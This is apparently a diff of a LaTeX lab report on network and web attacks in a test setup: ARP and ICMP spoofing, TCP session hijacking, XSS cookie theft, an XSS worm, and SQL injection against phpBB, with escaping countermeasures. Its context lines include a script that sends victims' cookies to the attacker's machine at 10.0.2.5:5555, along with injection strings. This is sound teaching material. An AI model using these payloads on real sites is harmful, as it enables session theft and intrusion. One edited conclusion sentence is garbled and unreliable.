@@ -1,4 +1,4 @@
-\documentclass[12pt, a4paper, pdflatex]{article}
+\documentclass[12pt, a4paper]{article}
 
 \usepackage[top=1in, bottom=1in, left=1in, right=1in]{geometry}
 \newcommand{\HRule}{\rule{\linewidth}{0.5mm}}
@@ -280,7 +280,7 @@ This results in connection between victim and the simulated server being termina
 
 \subsection{ICMP Blind Connection-Reset and Source-Quench Attacks}
 
-Another attack we attempted was to spoof ICMP packets for routers that would cause the reseting of connection or sending a ``source quench'' packet that would tell the router to slow down all the connections.
+Another attack we attempted was to spoof ICMP packets for routers that would cause the resetting of connection or sending a ``source quench'' packet that would tell the router to slow down all the connections.
 
 We used \texttt{netwox} tool to create these packets on the attacker machine.
 Using wireshark we can see that these spoofed packets were indeed being sent:\\
@@ -296,8 +296,8 @@ Last task in this section was to show how we can hijack an existing TCP session
 between a victim and an observer from an attacker machine. We observed existing telnet
 connection handshake using Wireshark on attacker machine (hence we had to perform ARP and ICMP redirection attacks).
 Our goal was to send ``pwd'' command to display path on observer machine, pretending to be victim. When we listened to the
-messages, we knew what were consecutive `seq' and and `ack' numbers. We had to use these values to prepare our packets. We had to insert
-the increased `ack' number to be our new `seq' number and the previous, increased sequence number to be our next `ack' that we want to receive from the observer.\\
+messages, we knew what were consecutive ``seq'' and and ``ack'' numbers. We had to use these values to prepare our packets. We had to insert
+the increased ``ack'' number to be our new ``seq'' number and the previous, increased sequence number to be our next ``ack'' that we want to receive from the observer.\\
 
 \includegraphics[width=.95\textwidth]{gfx/response.png}
 
@@ -360,7 +360,7 @@ And we could see the cookie when viewing the message:\\
 Using \texttt{echoserv} program on one of the machines in the same local network as the www server we were able to capture the cookie of a person viewing malicious post:\\
 
 \begin{center}\texttt{Hello Folks,\\<script>document.write('<img src=http://10.0.2.5:5555?c='+ escape(document.cookie) + '   >'); </script>\\This script is to test XSS. Thanks.}\end{center}
-This script creates image element. The browsers attempts a HTTP GET request to fetch the image. However, the url of the image is the address of our machine that captures a cookie. As parameter to the request we add a cookie encoded in a string.
+This script creates image element. The browsers attempts a HTTP GET request to fetch the image. However, the URL of the image is the address of our machine that captures a cookie. As parameter to the request we add a cookie encoded in a string.
 \includegraphics[width=.95\textwidth]{gfx/xss/task3-alice.png}\\[1cm]
 
 Then on attacker machine we can observe incoming request, therefore we are able to steal a cookie of anyone viewing the message.\\
@@ -397,7 +397,7 @@ The worm would post another reply as the user viewing the infected message, and 
 We can see that the reply "Attack" was created after that Bob visited the thread, however in the Firebug output now two requests are being made, because the new reply also contains the malicious script.\\
 \includegraphics[width=.95\textwidth]{gfx/xss/task6}
 
-Using such an attack, we could easily flood the forums by creating replies and new threads and maximize the probability that other users will see the malicious script and also be ``responsible'' for infecting the website. If the malicious script makes some intensive GET or POST requests, then using such a worm we could cause the denial of service attack. This emphasizes the importance of preventing the XSS by correctly escaping user provided input on the websites.
+Using such an attack, we could easily flood the forums by creating replies and new threads and maximize the probability that other users will see the malicious script and also be ``responsible'' for infecting the website. If the malicious script makes some intensive GET or POST requests, then using such a worm we could cause the denial of service attack (\cite{sunxss}). This emphasizes the importance of preventing the XSS by correctly escaping user provided input on the websites.
 
 \section{SQL injection attack}
 
@@ -415,7 +415,7 @@ On the server side when this is applied to PHP code to form the SQL query, the q
   frame=single,
   language=SQL,
   breaklines=true,
-  label=sql1
+  label=sql11
 }
 \begin{lstlisting}
 SELECT user_id, username, user_password, user_active, user_level,
@@ -443,7 +443,7 @@ We also provide old Alice's password and new password, that will be assigned to 
 	frame=single,
 	language=PHP,
 	breaklines=true,
-	label=sql1
+	label=sql12
 }
 \begin{lstlisting}
 $sql = "UPDATE " . USERS_TABLE . "
@@ -473,7 +473,7 @@ Also, we printed the resulting query to the Apache error log file and we could s
 	frame=single,
 	language=SQL,
 	breaklines=true,
-	label=sql1
+	label=sql13
 }
 \begin{lstlisting}
  SELECT user_id, username, user_password, user_active, user_level, user_login_tries, user_last_login_try\n\t\t\tFROM phpbb_users\n\t\t\tWHERE username = 'alice\\' or \\'1\\'=\\'1'
@@ -493,7 +493,7 @@ However, escaping quotes with a backslash may not be a good countermeasure, whic
 
 \subsubsection{Using \texttt{addslashes()}}
 
-For this task we show an alternative method of escaping strings. GPC cookies are turned off by default in PHP 5.3 and were removed completely in PHP 5.4. Mainly because of the overhead of checking every string and that not every request contains a query or script string. Now it is required to ``sanitize'' strings by a developer in code explicitly. One way of doing it is to call \texttt{addslashes} in PHP which does exactly the same to the strings as magic cookies---escapes quotes, double quotes, backslashes and null characters.\\
+For this task we show an alternative method of escaping strings. GPC cookies are turned off by default in PHP 5.3 and were removed completely in PHP 5.4. Mainly because of the overhead of checking every string and that not every request contains a query or script string. Now it is required to ``sanitize'' strings by a developer in code explicitly. One way of doing it is to call \texttt{addslashes} in PHP which does exactly the same to the strings as magic cookies---escapes quotes, double quotes, backslashes and null characters (\cite{php:sql}).\\
 
 We can enable it in our phpBB forum code and we indeed see in the logs that our attacks fail.\\
 The query string for logging-in looks exactly the same as in case of GPC cookies, what makes injecting SQL not effective:
@@ -503,7 +503,7 @@ The query string for logging-in looks exactly the same as in case of GPC cookies
 	frame=single,
 	language=SQL,
 	breaklines=true,
-	label=sqladdslash
+	label=sqladdslash1
 }
 \begin{lstlisting}
 SELECT user_id, username, user_password, user_active, user_level, user_login_tries, user_last_login_try\n\t\t\tFROM phpbb_users\n\t\t\tWHERE username = 'alice\\' or \\'1\\'=\\'1'
@@ -521,7 +521,7 @@ This code below demonstrates how to prevent the attack on \texttt{SELECT} statem
 	frame=single,
 	language=PHP,
 	breaklines=true,
-	label=sqladdslash
+	label=sqladdslash2
 }
 \begin{lstlisting}
 $sql = "SELECT user_id, username, user_password, user_active, user_level, user_login_tries, user_last_login_try
@@ -534,7 +534,7 @@ Again, we can see in the log file that query is escaped correctly:
 	frame=single,
 	language=SQL,
 	breaklines=true,
-	label=sqladdslash
+	label=sqladdslash3
 }
 \begin{lstlisting}
 [Mon Dec 15 13:17:05 2014] [error] [client 127.0.0.1] SELECT user_id, username, user_password, user_active, user_level, user_login_tries, user_last_login_try\n\t\t\tFROM phpbb_users\n\t\t\tWHERE username = 'alice\\' or \\'1\\'=\\'1', referer: http://www.sqllabmysqlphpbb.com/login.php
@@ -552,7 +552,7 @@ Again we show how to prevent the SQL injection in login.php:
 	frame=single,
 	language=PHP,
 	breaklines=true,
-	label=sqladdslash
+	label=sqladdslash4
 }
 \begin{lstlisting}	
 
@@ -576,7 +576,7 @@ Because \texttt{\$db} was not of type MySQLi, our code caused the following erro
 \includegraphics[width=.95\textwidth]{gfx/sql/mysqli.png}
 
 \section{Conclusions}
-Lorem ipsum
+All presented here attacks can cause potential harm to the owner of vulnerable system. All bugs allowing potential attacks have been addressed in updates and patches but it is never possible to have perfectly secure system. unavoidable to have perfe
 
 \vfill
 \bibliographystyle{plain}
@@ -595,7 +595,7 @@ Lorem ipsum
 	language=Bash,
 	breaklines=true,
 	caption="Script for performing ARP ICMP and SYN attacks",
-	label=parta:script
+	label=parta:script3
 }
 \begin{lstlisting}
 
@@ -670,7 +670,7 @@ esac
   language=Java,
   breaklines=true,
   caption="Java application for forging message with cookie.",
-  label=parta:script
+  label=parta:script4
 }
 \begin{lstlisting}
 import java.io.*;
@@ -782,7 +782,7 @@ public class HTTPSimpleForge {
   language=JavaScript,
   breaklines=true,
   caption="JavaScript for forging message.",
-  label=parta:script
+  label=parta:script1
 }
 \begin{lstlisting}
 <script>
@@ -845,7 +845,7 @@ Ajax.send(content);
   language=JavaScript,
   breaklines=true,
   caption="Self-replicating JavaScript for forging message.",
-  label=parta:script
+  label=parta:script2
 }
 \begin{lstlisting}
 <script id=worm>
